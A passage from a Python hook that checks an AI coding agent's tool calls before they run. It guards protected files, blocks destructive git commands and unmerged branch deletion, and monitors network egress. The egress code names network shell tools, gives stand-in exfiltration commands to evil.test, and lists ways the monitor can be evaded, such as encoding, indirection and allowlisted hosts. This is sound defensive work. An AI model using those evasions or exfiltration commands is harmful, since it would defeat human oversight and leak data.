        #   * scanning the whole command at once (`bash_file_targets` alone)
        #     sees every target of `a > log 2>> err`, which stopping at the
        #     first match did not — but it also reads a heredoc BODY as
        #     commands, so `cat > note <<EOF / rm -rf .env / EOF` reported a
        #     delete that the shell never runs.
        #   * splitting first (`command_segments` alone) drops the second and
        #     later targets of any one segment, because the per-segment form it
        #     was written against took only the first.
        #
        # Composed, `cd wt && ruff check tests/x.py && rm -f .env` still
        # refuses on `.env` — segmenting must not lose a real target — while a
        # segment that names nothing contributes nothing.
        for segment in command_segments(tool_input.get("command", "")):
            targets.extend(bash_file_targets(segment))

    zero_patterns = [p for t in [tiers.get("zero_access", {})] for p in t.get("patterns", [])]
    ro_patterns = [p for t in [tiers.get("read_only", {})] for p in t.get("patterns", [])]
    nd_patterns = [p for t in [tiers.get("no_delete", {})] for p in t.get("patterns", [])]

    for file_path, is_write, is_delete in targets:
        if not file_path:
            continue

        # Zero access — block everything
        if _matches_tier(file_path, zero_patterns):
            return (
                f"BLOCKED: File '{file_path}' is in zero_access tier (D-ORCH-8). "
                "No access allowed."
            )

        # Read only — block writes and deletes
        if (is_write or is_delete) and _matches_tier(file_path, ro_patterns):
            return (
                f"BLOCKED: File '{file_path}' is in read_only tier (D-ORCH-8). "
                "Write/delete prohibited."
            )

        # No delete — block deletes only
        if is_delete and _matches_tier(file_path, nd_patterns):
            return (
                f"BLOCKED: File '{file_path}' is in no_delete tier (D-ORCH-8). "
                "Deletion prohibited."
            )

    return None


# ── 6. Unmerged remote-branch deletion ────────────────────────────────────


def remote_branch_delete_targets(command: str) -> List[str]:
    """Remote branches a command would DELETE. Empty when it deletes nothing.

    Recognises the three forms that actually reach GitHub::

        git push <remote> --delete <branch> [<branch>...]
        git push <remote> :<branch>
        gh api -X DELETE .../git/refs/heads/<branch>

    ``git branch -D`` is deliberately NOT included: it deletes a LOCAL ref,
    which cannot close a PR or remove anything from the remote.
    """
    if "push" not in command and "DELETE" not in command:
        return []
    try:
        tokens = shlex.split(command, posix=(os.name != "nt"))
    except ValueError:
        return []

    out: List[str] = []
    for i, tok in enumerate(tokens):
        if tok == "push":
            rest = tokens[i + 1:]
            positional = [t for t in rest if not t.startswith("-")]
            if any(t in ("--delete", "-d") for t in rest):
                # everything positional after the remote is a branch
                out += positional[1:] if len(positional) > 1 else []
            out += [t[1:] for t in rest if t.startswith(":") and len(t) > 1]
        elif tok == "DELETE":
            for t in tokens[i + 1:]:
                if "git/refs/heads/" in t:
                    out.append(t.split("git/refs/heads/", 1)[1].strip("/"))
    return [b for b in out if b]


def check_branch_deletion(
    tool_name: str, tool_input: dict, repo_root: Optional[Path] = None
) -> Optional[str]:
    """Refuse to delete a remote branch that still holds unmerged commits.

    On 2026-08-07 an agent "cleaning up duplicates" deleted four remote branches
    matching one task id in a six-second burst. One was PR #1332 with every check
    green: deleting a head branch makes GitHub close the PR as CLOSED-not-merged,
    so the work vanished with no review and no failure — and ``gh pr reopen`` then
    fails because the head ref is gone.

    A task legitimately has several branches — a retry, a rebase, a rival
    implementation, a human's fix. Sharing a task id is never grounds for
    deletion. Unmerged commits are grounds for refusal.

    Compared locally with ``git cherry`` so the check stays fast and works
    offline, and fails OPEN on any error.
    """
    if tool_name != "Bash":
        return None
    if _off("ICDEV_BRANCH_DELETE_GUARD"):
        return None
    branches = remote_branch_delete_targets(tool_input.get("command", "") or "")
    if not branches:
        return None
    try:
        root = _resolve_root(repo_root)
        blocked = []
        for br in branches:
            res = subprocess.run(
                ["git", "cherry", "origin/main", f"origin/{br}"],
                cwd=str(root), capture_output=True, text=True, timeout=30,
            )
            if res.returncode != 0:
                continue  # cannot compare -> allow (fail open)
            unique = [ln for ln in res.stdout.splitlines() if ln.startswith("+")]
            if unique:
                blocked.append((br, len(unique)))
        if not blocked:
            return None
        detail = "\n".join(
            f"    origin/{b}: {n} commit(s) not on origin/main" for b, n in blocked)
        return (
            "BLOCKED: refusing to delete a remote branch that still holds "
            "unmerged work.\n" + detail + "\n"
            "  Deleting a head branch CLOSES its pull request as closed-not-merged,\n"
            "  and `gh pr reopen` cannot undo it once the ref is gone.\n"
            "  Merge or explicitly close the PR first. A shared task id is not a\n"
            "  reason to delete a branch — a task legitimately has several.\n"
            "  Deliberate discard: ICDEV_BRANCH_DELETE_GUARD=0"
        )
    except Exception:
        return None  # fail open — never block on a broken guard


# ── 7. Worktree path enforcement ──────────────────────────────────────────

#: A token the shell would expand before git ever sees it. `shlex` strips the
#: quotes but cannot resolve the value, so what reaches this parser is the
#: literal `$P` / `${WT}` / `` `pwd` `` — never a path.
_UNEXPANDED_RE = re.compile(r"[$`]")


def worktree_add_target(command: str, posix: Optional[bool] = None) -> Optional[str]:
    """Target path of a ``git worktree add`` in *command*, or None.

    Returns None whenever the path cannot be determined with confidence — the
    caller treats that as "allow". A parser that guesses would block legitimate
    work, which is strictly worse than failing to catch a stray worktree.

    The shlex mode must follow the OS, because neither mode is correct on both::

        "git worktree add C:\\Users\\u\\wt"   posix=True  -> "C:Usersuwt"       WRONG
        "git worktree add /tmp/my\\ dir"      posix=False -> ["/tmp/my\\","dir"] WRONG

    On Windows a backslash is a path separator; on POSIX it is an escape. Pick
    by platform rather than hardcoding either. *posix* is overridable so both
    branches stay testable on a single host.
    """
    if "worktree" not in command or "add" not in command:
        return None
    if posix is None:
        posix = os.name != "nt"
    # Only the segment that actually runs `git worktree add`. Otherwise
    # `cd repo && P=$(...worktree_paths...) && git worktree add --detach "$P"`
    # is parsed as one token stream and the `cd`'s arguments can be read as the
    # target — which is how `gh pr checks 1537` scored as a stray worktree.
    for segment in command_segments(command):
        if "worktree" in segment and "add" in segment:
            command = segment
            break
    try:
        tokens = shlex.split(command, posix=posix)
        if not posix:
            # Non-posix mode leaves quotes attached to the token.
            tokens = [t[1:-1] if len(t) > 1 and t[0] == t[-1] and t[0] in "\"'" else t
                      for t in tokens]
    except ValueError:
        return None

    for i in range(len(tokens) - 2):
        if tokens[i].endswith("git") and tokens[i + 1] == "worktree" and tokens[i + 2] == "add":
            rest = tokens[i + 3:]
            break
    else:
        return None

    skip_next = False
    for tok in rest:
        if skip_next:
            skip_next = False
            continue
        if tok in ("-b", "-B", "--reason", "--lock-reason"):
            skip_next = True          # these take a value that is NOT the path
            continue
        if tok.startswith("-"):
            continue                  # --detach, --no-checkout, --force, ...
        if _UNEXPANDED_RE.search(tok):
            # `git worktree add --detach "$P"` where P came from
            # `python -m tools.git.worktree_paths --path cli <slug>`: the
            # EXACT form CLAUDE.md prescribes. The shell expands it; this hook
            # cannot, so the target is unknown — and an unknown target is the
            # documented "cannot be determined with confidence" case, not a
            # violation. Measured 2026-08-12: 640 of this check's 652 refusals
            # over 30 days were compliant sessions blocked on `"$P"`, i.e. the
            # guard would have refused the convention it exists to enforce.
            return None
        return tok                    # first positional is the worktree path
    return None


def check_worktree_path(
    tool_name: str, tool_input: dict, repo_root: Optional[Path] = None
) -> Optional[str]:
    """Refuse a ``git worktree add`` outside the sanctioned roots.

    Measured 2026-08-07: 150 registered worktrees across 22 parent directories,
    118 of them stray — 33 flat in %TEMP%\\claude, 28 in C:\\AI\\.worktrees, 27
    nested inside another worktree. Five basenames collided across parents, and
    two simultaneous ``wt-wake2`` checkouts on different branches are how one
    session's edits appeared in another session's working tree.

    CLAUDE.md has asked for a worktree convention in prose since the beginning
    and produced those 150. A check is what makes a convention hold, so this
    blocks rather than warns. Set ICDEV_WORKTREE_GUARD=0 to disable.

    Fails OPEN: any resolution error allows the command. A guard that cannot
    parse a path must not be the reason a session cannot work.
    """
    if tool_name != "Bash":
        return None
    if _off("ICDEV_WORKTREE_GUARD"):
        return None
    command = tool_input.get("command", "") or ""
    target = worktree_add_target(command)
    if not target:
        return None
    try:
        root = _resolve_root(repo_root)
        if str(root) not in sys.path:
            sys.path.insert(0, str(root))
        from tools.git.worktree_paths import describe_violation, is_sanctioned

        if is_sanctioned(target, repo_root=root):
            return None
        return "BLOCKED: " + describe_violation(target)
    except Exception:
        return None  # fail open — never block on a broken guard


# ── 8. review_loop pre-commit self-green ──────────────────────────────────


def check_review_loop_precommit(
    tool_name: str,
    tool_input: dict,
    repo_root: Optional[Path] = None,
    notify: Optional[Callable[[str], None]] = None,
) -> Optional[str]:
    """Self-green staged changes with review_loop before a ``git commit``.

    Fires only on Bash ``git commit`` calls. Runs the fast, staged, ruff-only
    review loop (coherence/SIPA are too slow for a commit gate — they run in the
    pre-PR preflight + CI), applies deterministic ruff autofixes to the staged
    ``.py`` files, and re-stages them so the commit lands lint-clean.

    Warn-only by default: returns None (the commit proceeds) and reports through
    *notify*. Set ICDEV_REVIEW_LOOP_BLOCK=1 to return a block reason for a
    non-green commit, or ICDEV_REVIEW_LOOP_PRECOMMIT=0 to disable entirely.
    Best-effort: any error is swallowed so it can never break a commit.
    """
    if tool_name != "Bash":
        return None
    command = tool_input.get("command", "")
    if "git commit" not in command:
        return None
    if _off("ICDEV_REVIEW_LOOP_PRECOMMIT"):
        return None

    def _say(message: str) -> None:
        if notify is not None:
            notify(message)

    try:
        root = _resolve_root(repo_root)
        if str(root) not in sys.path:
            sys.path.insert(0, str(root))
        from tools.quality.review_loop import preflight

        report = preflight(
            base=None, autofix=True, staged=True,
            only_gates=["ruff"], coherence_scope="changed",
            audit=False, max_iterations=1, repo_root=root,
        )
        # Re-stage whatever ruff --fix rewrote so the fixes are committed.
        if report.changed_files:
            subprocess.run(
                ["git", "add", *report.changed_files],
                cwd=str(root), capture_output=True, text=True, timeout=30,
            )
        if not report.green:
            n = len(report.fix_brief)
            msg = (
                f"review_loop (pre-commit): {n} unfixable lint finding(s) remain "
                f"in staged files — {report.reason}"
            )
            if _on("ICDEV_REVIEW_LOOP_BLOCK"):
                return f"BLOCKED: {msg}"
            _say(f"WARNING: {msg} (commit proceeding; set ICDEV_REVIEW_LOOP_BLOCK=1 to block)")
        elif report.changed_files:
            _say("review_loop (pre-commit): applied ruff autofixes to staged files")
    except SystemExit:
        raise
    except Exception:
        return None  # never break a commit
    return None


# ── 9. Destructive git blocklist ──────────────────────────────────────────
#
# OPT-51 — adapted from mattpocock/skills/git-guardrails-claude-code (MIT). See
# _ATTRIBUTION_REGISTRY in tools/workflow/coherence_checker.py.
#
# These commands can silently destroy work in a non-recoverable way.
#
# hgx-guard-02 moved the patterns here so both guard paths share one copy — but
# only the HEADLESS path ever called the check. `.claude/hooks/pre_tool_use.py`
# ::main() never did, so `git reset --hard origin/main` and `git clean -fdx` were
# refused headlessly and ALLOWED in a Claude Code session, which is backwards:
# the Claude Code session is the one running with the vendor permission system
# turned off (D394). exa-bench-06 wired it into main() and added
# tests/hooks/test_hook_parity.py, which asserts the two paths run the same set.

GIT_DANGER_PATTERNS: Tuple[Tuple[str, str], ...] = (
    # Force push. `--force-with-lease` is deliberately NOT here — see
    # `_GIT_FORCE_WITH_LEASE_RE` below.
    (r"\bgit\s+push\s+(?:[^\n]*\s)?(?:--force\b|-f\b)",
     "git push --force is destructive — rewrites remote history"),
    # Hard reset anything
    (r"\bgit\s+reset\s+(?:[^\n]*\s)?--hard\b",
     "git reset --hard discards uncommitted changes"),
    # Force delete branches. -D is case-sensitive (distinct from safe -d).
    (r"\bgit\s+branch\s+(?:[^\n]*\s)?(?-i:-D)\b",
     "git branch -D force-deletes branches (use -d for safe delete)"),
    (r"\bgit\s+branch\s+(?:[^\n]*\s)?--delete\s+--force\b",
     "git branch --delete --force force-deletes branches"),
    # Dangerous clean. Only the WHOLE-TREE form, or one that also removes
    # ignored files (`-x`) — a pathspec-scoped `git clean -fd build/` deletes
    # what the caller named and nothing else. 9 of the 9 scoped cleans in the
    # 30-day corpus were routine (`git clean -fd data/studio_artifacts/`).
    (r"\bgit\s+clean\s+(?:[^\n]*\s)?-[a-zA-Z]*(?:f[a-zA-Z]*x|x[a-zA-Z]*f)\b",
     "git clean -fx permanently deletes untracked AND ignored files"),
    (r"\bgit\s+clean\s+(?:-[a-zA-Z]+\s+)*-[a-zA-Z]*f[a-zA-Z]*\s*$",
     "git clean -f with no pathspec deletes every untracked file in the tree"),
    # Checkout/restore of the WHOLE working tree — can wipe uncommitted edits.
    # `\.` alone matched the leading dot of a dotfile, so `git checkout --
    # .cursor/mcp-setup.md` — a path-scoped restore of one file — read as
    # `git checkout -- .` and refused. 17 of 17 such fires in the corpus were
    # that bug. The `.` must therefore be a whole token.
    (r"\bgit\s+checkout\s+(?:--\s+)?\.(?=\s|$)",
     "git checkout . discards uncommitted working-tree changes"),
    (r"\bgit\s+restore\s+(?:[^\n]*\s)?(?:--\s+)?\.(?=\s|$)",
     "git restore . discards uncommitted working-tree changes"),
    # Interactive rebase cannot be driven by an agent
    (r"\bgit\s+rebase\s+(?:[^\n]*\s)?-i\b",
     "interactive git rebase requires manual approval (no automation)"),
)

#: `--force-with-lease` refuses the push when the remote moved under it, which
#: is exactly the collision this repo's concurrent sessions have to survive, and
#: it is what those sessions actually run: 127 of the 30-day corpus's 389
#: git_danger fires were this form, on the session's own `kanban/*` branch.
#: Blocking it would have made the guard's single largest category "the
#: prescribed workflow", and a guard that refuses the prescribed workflow gets
#: switched off. Bare `--force` / `-f` stays refused.
_GIT_FORCE_WITH_LEASE_RE = re.compile(r"\bgit\s+push\b[^\n]*--force-with-lease\b")

#: Pattern -> the git subcommand it is about, parsed from the pattern's own
#: ``\bgit\s+<word>`` prefix so the two cannot drift.
_GIT_SUBCOMMAND_IN_PATTERN = re.compile(r"\\bgit\\s\+([a-z-]+)")

_GIT_DANGER_COMPILED = tuple(
    (
        re.compile(pattern, re.IGNORECASE),
        reason,
        (_GIT_SUBCOMMAND_IN_PATTERN.match(pattern).group(1)
         if _GIT_SUBCOMMAND_IN_PATTERN.match(pattern) else ""),
    )
    for pattern, reason in GIT_DANGER_PATTERNS
)

_GIT_SUBCOMMAND_RE = re.compile(r"^\s*git\s+(?:-[^\s]+\s+)*([a-z][a-z-]*)", re.IGNORECASE)


def git_subcommand(segment: str) -> str:
    """The git subcommand a segment invokes, lowercased, or ``""``."""
    match = _GIT_SUBCOMMAND_RE.match(segment or "")
    return match.group(1).lower() if match else ""


def _git_danger_segment_reason(segment: str) -> Optional[str]:
    """The refusal for ONE shell segment that actually invokes ``git``."""
    if command_word(segment) != "git":
        return None
    if _GIT_FORCE_WITH_LEASE_RE.search(segment):
        return None
    subcommand = git_subcommand(segment)
    for pattern, reason, pattern_subcommand in _GIT_DANGER_COMPILED:
        # `git commit -m "…git clean -xdf…"` is a commit, not a clean. Only the
        # rules for the subcommand this segment actually runs may refuse it.
        if pattern_subcommand and subcommand and pattern_subcommand != subcommand:
            continue
        if pattern.search(segment):
            return reason
    return None


def git_danger_reason(command: str) -> Optional[str]:
    """Return the reason a command is a destructive git call, else None.

    Case-insensitive, and evaluated **per shell segment whose command word is
    actually** ``git`` — not against the raw command text. Two measured reasons
    (30-day corpus, 96,542 tool calls, exa-bench-05):

    * The raw text includes heredoc bodies and quoted arguments, so a commit
      message or PR body describing ``git reset --hard``, and a
      ``python -c "…'git push --force'…"`` probe, both refused. 130 of 389.
    * ``(?:[^\\n]*\\s)?`` spans ``&&`` and ``;``, so the ``--force`` of a later
      ``git worktree remove … --force`` completed an earlier ``git push``.

    This is the same narrowing :func:`is_dangerous_rm_command` documents, for
    the same reason: these checks became able to REFUSE when exa-bench-05
    removed ``|| true``, so a match on prose is now a blocked call.
    """
    for segment in command_segments(command):
        reason = _git_danger_segment_reason(segment)
        if reason:
            return reason
    return None


def check_git_danger(tool_name: str, tool_input: dict) -> Optional[str]:
    """Block reason for a destructive git command. Bash-shaped calls only."""
    if tool_name not in ("Bash", "bash", "shell"):
        return None
    reason = git_danger_reason(tool_input.get("command", "") or "")
    return f"BLOCKED: {reason}" if reason else None


# ── 10. AGOV declarative agent rules (agov-det-06) ────────────────────────
#
# The only check here that is DATA-DRIVEN rather than hardcoded, and the only
# one that is monitor-only by default: it records what matched to
# ``agent_findings`` and allows the call. It refuses only for a rule that both
# sets ``enforce: true`` and lives in the operator-controlled directory.
#
# It runs LAST, after all nine checks above, so it can only ever add a refusal
# to a call the existing guardrails already allowed. None of them were migrated
# onto the rule engine and none should be: rewriting the load-bearing blocks
# behind a new evaluator in the same change is how one goes missing silently.

_UNSET_GATE = object()
_AGENT_GATE: object = _UNSET_GATE


def _agent_gate(repo_root: Optional[Path]):
    """The ``tools/agent_detect/gate.py`` module, or None if unavailable.

    Loaded BY PATH when the ``tools`` package is not already imported, for the
    same reason this file is: importing ``tools`` executes the compatibility
    shim (92ms measured) and this runs before every tool call. In a process that
    already has ``tools`` imported — tests, hook_compat, any CLI — the normal
    import is used so there is one module object rather than two.
    """
    global _AGENT_GATE
    if _AGENT_GATE is _UNSET_GATE:
        _AGENT_GATE = None
        try:
            if "tools" in sys.modules:
                from tools.agent_detect import gate  # noqa: PLC0415

                _AGENT_GATE = gate
            else:
                import importlib.util  # noqa: PLC0415

                path = _resolve_root(repo_root) / "tools" / "agent_detect" / "gate.py"
                spec = importlib.util.spec_from_file_location(
                    "icdev_hook_agent_detect_gate", path
                )
                module = importlib.util.module_from_spec(spec)
                # Registered before exec_module: dataclasses resolve their own
                # module out of sys.modules while the class body is executing.
                sys.modules[spec.name] = module
                spec.loader.exec_module(module)
                _AGENT_GATE = module
        except Exception:  # noqa: BLE001 — an absent gate must not stop the guard
            _AGENT_GATE = None
    return _AGENT_GATE


def reset_agent_gate() -> None:
    """Drop the cached gate module. Tests only."""
    global _AGENT_GATE
    _AGENT_GATE = _UNSET_GATE


def check_agent_rules(
    tool_name: str, tool_input: dict, repo_root: Optional[Path] = None
) -> Optional[str]:
    """Deny reason from an enforcing agent rule, else None.

    Fails OPEN on every internal error, unlike the checks above. They encode a
    fixed judgement that has been reviewed; this one runs operator-authored YAML
    that may have landed five minutes ago, so a rule pack that cannot be parsed
    must leave the session exactly as protected as it was before AGOV rather
    than stopping it from working.
    """
    gate = _agent_gate(repo_root)
    if gate is None:
        return None
    try:
        return gate.check_tool_call(tool_name, tool_input, root=_resolve_root(repo_root))
    except Exception:  # noqa: BLE001 — see docstring
        return None


# ── 11. Network egress (exa-bench-08) ─────────────────────────────────────
#
# Until this check existed the hook had no concept of the network at all. The
# in-process agent loop did halt the obvious exfil commands, but only
# incidentally: `approval_gate` escalates `curl -X POST` by pattern and catches
# everything else because `default_tier: unknown` halts anything unenumerated.
# Allowlisting one HTTP tool, or adding a `curl` downgrade pattern, would have
# removed that silently. Nothing modelled the destination.
#
# The spawned CLI has none of that. `tools/agents/adapters/claude_cli.py` runs
# with `--dangerously-skip-permissions` (ADR D394), so neither gate is in its
# path — this hook is the only thing between that session and the network.

_EGRESS_POLICY_CACHE: Dict[str, Optional[dict]] = {}

#: Tools whose destination may be written as a bare host rather than a URL.
#: Bare-hostname extraction is restricted to these because outside them a
#: dotted token is overwhelmingly a filename (`README.md`, `tools/foo.py`).
_BARE_HOST_TOOLS = frozenset(
    {"nc", "ncat", "netcat", "socat", "telnet", "ssh", "scp", "sftp",
     "rsync", "ftp", "lftp"}
)

_EGRESS_URL_RE = re.compile(
    r"(?i)\b[a-z][a-z0-9+.\-]{1,15}://(?P<netloc>[^\s/?\#'\"`|;&()<>\\]+)"
)

#: Legal DNS presentation characters. Applied to every extracted host because
#: the URL regex above happily captures an interpolation left half — measured:
#: ``f"postgresql://{os.environ[...]}"`` yielded the "host" ``{os.environ[chr``.
_DNS_CHARS_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9._\-]*[A-Za-z0-9])?$")

#: Pipeline separators. Bare-host extraction is scoped to the segment whose
#: PROGRAM is a bare-host tool, so an `ssh` mentioned inside a heredoc does not
#: turn every dotted token in the command into a candidate hostname.
_SEGMENT_SPLIT_RE = re.compile(r"\|\||&&|[|;&\n]")

#: Leading words that precede the real program without being it.
_COMMAND_PREFIXES = frozenset(
    {"env", "sudo", "nohup", "time", "command", "exec", "unset", "export", "cd"}
)

#: A last label that is alphabetic and 2-24 chars. Deliberately not a TLD list:
#: a stale list would silently stop seeing new gTLDs, and being slightly broad
#: only over-reports in a monitor-only check.
_TLD_LIKE_RE = re.compile(r"(?i)^[a-z]{2,24}$")

#: Dotted tokens that pass the TLD shape but are near-always local files.
_NOT_A_TLD = frozenset(
    {"py", "md", "txt", "json", "yaml", "yml", "sh", "ps1", "sql", "log",
     "csv", "html", "js", "ts", "tsx", "jsx", "css", "cfg", "ini", "toml",
     "lock", "gz", "zip", "tar", "png", "jpg", "svg", "pdf", "exe", "dll",
     "so", "db", "bak", "tmp", "orig", "rej", "patch", "diff", "env"}
)


def _read_egress_policy(root: Path) -> Optional[dict]:
    """Uncached read of the egress policy. None when absent, unparsable or off."""
    try:
        import yaml  # noqa: PLC0415
    except ImportError:
        return None
    config_path = root / "args" / "agent_egress_policy.yaml"
    if not config_path.exists():
        return None
    try:
        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
        policy = (config or {}).get("agent_egress", {})
        if not policy.get("enabled", False):
            return None
        return policy
    except Exception:  # noqa: BLE001 — a broken policy must not stop the session
        return None


def _load_egress_policy(root: Path) -> Optional[dict]:
    """Memoized per repo root — the hook process is short-lived (see #5)."""
    key = str(root)
    if key not in _EGRESS_POLICY_CACHE:
        _EGRESS_POLICY_CACHE[key] = _read_egress_policy(root)
    return _EGRESS_POLICY_CACHE[key]


def reset_egress_policy() -> None:
    """Drop the cached policy. Tests only."""
    _EGRESS_POLICY_CACHE.clear()


def _strip_host(netloc: str) -> str:
    """Reduce a URL netloc to its bare host: drop userinfo, port, brackets."""
    host = netloc.rsplit("@", 1)[-1]          # user:pass@host -> host
    if host.startswith("["):                   # [::1]:443 -> ::1
        end = host.find("]")
        if end != -1:
            return host[1:end]
    return host.rsplit(":", 1)[0] if host.count(":") == 1 else host


def _looks_like_hostname(token: str) -> bool:
    """True for a dotted token whose last label has the shape of a TLD."""
    if not token or "/" in token or "\\" in token:
        return False
    labels = token.rstrip(".").split(".")
    if len(labels) < 2 or not all(labels):
        return False
    last = labels[-1].lower()
    return bool(_TLD_LIKE_RE.match(last)) and last not in _NOT_A_TLD


def _host_is_local(host: str) -> bool:
    """True when *host* cannot carry data off this machine.

    The IP-range test is the same partition ``tools/http/egress_guard.py``
    makes, used with the OPPOSITE sign. That module is an SSRF guard: it
    REFUSES loopback/RFC1918 so a confused fetcher cannot reach into the
    internal network. Here those addresses are the safe case and a public one
    is the risk, which is why it is reimplemented rather than imported —
    ``tools/browser/scope.py`` already skips ``egress_guard`` for loopback for
    this exact reason.
    """
    if not host:
        return True
    host = host.strip().rstrip(".").lower()
    if not host:
        return True
    try:
        import ipaddress  # noqa: PLC0415

        ip = ipaddress.ip_address(host)
    except ValueError:
        pass
    except Exception:  # noqa: BLE001
        return False
    else:
        return bool(
            ip.is_private or ip.is_loopback or ip.is_link_local
            or ip.is_multicast or ip.is_reserved or ip.is_unspecified
        )
    if host == "localhost" or host.endswith(".localhost"):
        return True
    if any(host.endswith(s) for s in (".local", ".internal", ".lan", ".home.arpa")):
        return True
    # A single-label name has no public DNS delegation, so it cannot address a
    # host outside this network.
    return "." not in host


def _suffix_match(host: str, patterns: Sequence[str]) -> bool:
    """Suffix match, so ``github.com`` covers ``api.github.com``."""
    host = host.rstrip(".").lower()
    for raw in patterns or ():
        pattern = str(raw).strip().lstrip("*.").rstrip(".").lower()
        if pattern and (host == pattern or host.endswith("." + pattern)):
            return True
    return False


def _command_tokens(command: str) -> List[str]:
    """Best-effort argv tokens. Falls back to whitespace splitting."""
    try:
        return shlex.split(command, posix=True)
    except Exception:  # noqa: BLE001 — unbalanced quotes are common in the wild
        return command.split()


def egress_destinations(command: str) -> List[str]:
    """Non-local network destinations named anywhere in *command*.

    Two extraction passes, because the two evade differently:

    1. **URLs, over the raw string.** Deliberately not over tokens — the point
       is to see ``https://evil.test`` inside
       ``python -c "urllib.request.urlopen('https://evil.test')"``, which a
       ``curl``/``wget`` pattern list never sees.
    2. **Bare hosts, over the tokens**, and only for the tools in
       :data:`_BARE_HOST_TOOLS`. ``nc evil.test 4444`` carries no URL at all.

    Returns hosts in first-seen order, deduplicated, already filtered to those
    :func:`_host_is_local` calls non-local.
    """
    found: List[str] = []
    seen = set()

    def _add(host: str) -> None:
        host = (host or "").strip().rstrip(".").lower()
        if not host or host in seen:
            return
        if not (_DNS_CHARS_RE.match(host) or _is_ip_literal(host)):
            return
        if _host_is_local(host):
            return
        seen.add(host)
        found.append(host)

    for match in _EGRESS_URL_RE.finditer(command or ""):
        _add(_strip_host(match.group("netloc")))

    for segment in _SEGMENT_SPLIT_RE.split(command or ""):
        if _segment_program(segment) not in _BARE_HOST_TOOLS:
            continue
        for token in _command_tokens(segment):
            if token.startswith("-") or "://" in token:
                continue
            # socat spells it TCP:host:port; scp spells it user@host:path.
            for part in re.split(r"[:@,]", token):
                part = part.strip()
                if not part or part.isdigit():
                    continue
                if _looks_like_hostname(part) or _is_ip_literal(part):
                    _add(part)
    return found


def _is_ip_literal(token: str) -> bool:
    try:
        import ipaddress  # noqa: PLC0415

        ipaddress.ip_address(token)
    except Exception:  # noqa: BLE001 — not an address
        return False
    return True


def _segment_program(segment: str) -> str:
    """The program a pipeline segment actually runs, or ``""``.

    Skips leading ``VAR=value`` assignments and wrappers like ``env``/``sudo``,
    so ``env -u GITHUB_TOKEN ssh host`` reports ``ssh``. Flags are skipped only
    while looking for the program name.
    """
    for token in _command_tokens(segment):
        if "=" in token and not token.startswith("-") and "/" not in token:
            continue  # VAR=value
        if token.startswith("-"):
            continue
        name = _program_basename(token)
        if name in _COMMAND_PREFIXES:
            continue
        return name
    return ""


def _program_basename(token: str) -> str:
    """``/usr/bin/curl.exe`` -> ``curl``. Lowercased, extension stripped."""
    name = token.replace("\\", "/").rsplit("/", 1)[-1].lower()
    for suffix in (".exe", ".cmd", ".bat", ".ps1"):
        if name.endswith(suffix):
            name = name[: -len(suffix)]
    return name


def _network_invoker(command: str, invokers: Sequence[str]) -> Optional[str]:
    """The first recognised network-capable program in *command*, if any."""
    wanted = {str(i).strip().lower() for i in (invokers or ()) if str(i).strip()}
    if not wanted:
        return None
    for token in _command_tokens(command or ""):
        name = _program_basename(token)
        if name in wanted:
            return name
    return None


def _record_egress_finding(root: Path, policy: dict, finding: dict) -> None:
    """Append one JSONL finding. Never raises, never blocks on failure."""
    try:
        import json  # noqa: PLC0415
        from datetime import datetime, timezone  # noqa: PLC0415

        rel = str(policy.get("log_path") or ".tmp/egress_findings.jsonl")
        path = Path(rel) if Path(rel).is_absolute() else root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        finding = dict(finding)
        finding["at"] = datetime.now(timezone.utc).isoformat()
        with path.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(finding, ensure_ascii=False) + "\n")
    except Exception:  # noqa: BLE001 — telemetry must never take the guard down
        pass


def check_network_egress(
    tool_name: str, tool_input: dict, repo_root: Optional[Path] = None
) -> Optional[str]:
    """Block reason for a command that sends data to an unapproved destination.

    Monitor-only by default: every finding is appended to the JSONL sink named
    by ``args/agent_egress_policy.yaml``, and ``None`` is returned so the call
    proceeds. Set ``enforce: true`` there, or ``ICDEV_EGRESS_GUARD_ENFORCE=1``,
    to turn a ``verdict: egress`` finding into a refusal. ``ICDEV_EGRESS_GUARD=0``
    disables it outright. Fails OPEN on every internal error.

    **What it models.** The DESTINATION, not the program. A host that is neither
    local nor allowlisted is the finding; the program is only a confidence
    signal on top of it. That ordering is the whole point — a
    ``curl``/``wget`` pattern list is defeated by ``python -c "urllib..."`` or a
    raw IP, and both of those still name a destination.

    Two verdicts, and they are not interchangeable:

    ``egress``
        A non-local, non-allowlisted destination AND a recognised
        network-capable program. Blockable when enforcing.
    ``destination_only``
        The destination, with no recognised program. Recorded, never blocked —
        an unrecognised program is exactly the case this check cannot decide,
        and pretending otherwise would be the dishonest half of the control.

    **Evasion boundary — what this does NOT catch.** Stated plainly because a
    guard whose limits are implied gets trusted past them. A shell command is
    not statically decidable, so every one of these passes:

    * **Indirection through the shell.** ``curl "$URL"``, ``curl $(cat u.txt)``,
      ``eval "$payload"``. The destination is not in the string this check sees.
    * **Encoding.** A base64 or hex host decoded at runtime; a host assembled by
      concatenation (``"evi"+"l.test"``); punycode nobody has normalised.
    * **A second file.** ``python exfil.py``, ``bash deploy.sh``, or any
      compiled binary. The destination lives in a file, and this check reads
      commands, not file contents.
    * **An allowlisted carrier.** ``github.com`` is allowlisted, so a gist push,
      a branch of secrets, or a GitHub issue body is egress this permits by
      construction. Allowlisting a host allows *everything* that host can carry.
    * **Non-IP transports.** DNS tunnelling, ICMP, a bound listener the peer
      connects INTO, anything already-open like an SSH master socket.
    * **Length.** Extraction runs over the literal command text only; a
      destination assembled across two tool calls is invisible to both.

    What it does raise the cost of: the direct, unobfuscated exfil that the
    four probes in ``tests/test_skip_permissions_compensating_controls.py``
    represent, on the surface — the spawned CLI — where nothing was watching at
    all. It is a tripwire with a named blind spot, not a network boundary. The
    boundary is ``egress_policy_manager``'s NetworkPolicy, at the pod.
    """
    if _off("ICDEV_EGRESS_GUARD"):
        return None
    try:
        root = _resolve_root(repo_root)
        policy = _load_egress_policy(root)
        if not policy:
            return None

        command_tools = policy.get("command_tools") or []
        if tool_name not in command_tools:
            return None
        command = (tool_input or {}).get("command") or ""
        if not isinstance(command, str) or not command.strip():
            return None

        destinations = egress_destinations(command)
        if not destinations:
            return None

        denied = [
            h for h in destinations
            if _suffix_match(h, policy.get("denied_hosts") or [])
        ]
        unapproved = [
            h for h in destinations
            if h in denied
            or not _suffix_match(h, policy.get("allowed_hosts") or [])
        ]
        if not unapproved:
            return None

        invoker = _network_invoker(command, policy.get("network_invokers") or [])
        verdict = "egress" if invoker else "destination_only"

        _record_egress_finding(
